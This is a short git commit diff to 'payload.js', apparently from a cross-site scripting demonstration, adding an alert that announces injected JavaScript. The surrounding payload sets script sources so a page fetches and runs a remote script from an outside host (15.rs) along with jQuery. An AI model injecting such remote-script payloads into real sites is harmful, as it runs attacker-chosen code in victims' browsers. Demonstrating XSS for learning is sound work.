5bdceb5f1e3709d58fd66165bb6da671d87549a4
Data <40370115+TikvahTerminator@users.noreply.github.com>
2020-02-03 16:50:59 +0000

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,3 +1,4 @@
 document.getElementById("j").setAttribute("src","https://code.jquery.com/jquery-3.4.1.js");
 document.getElementById("f").setAttribute("src","https://15.rs/1.js");
+alert("Check the console and the debug to see JS has been injected!");
 /*15.rs is by Matt Evans.  I do not claim to own this, i'm simply borrowing it to demonstrate XSS */
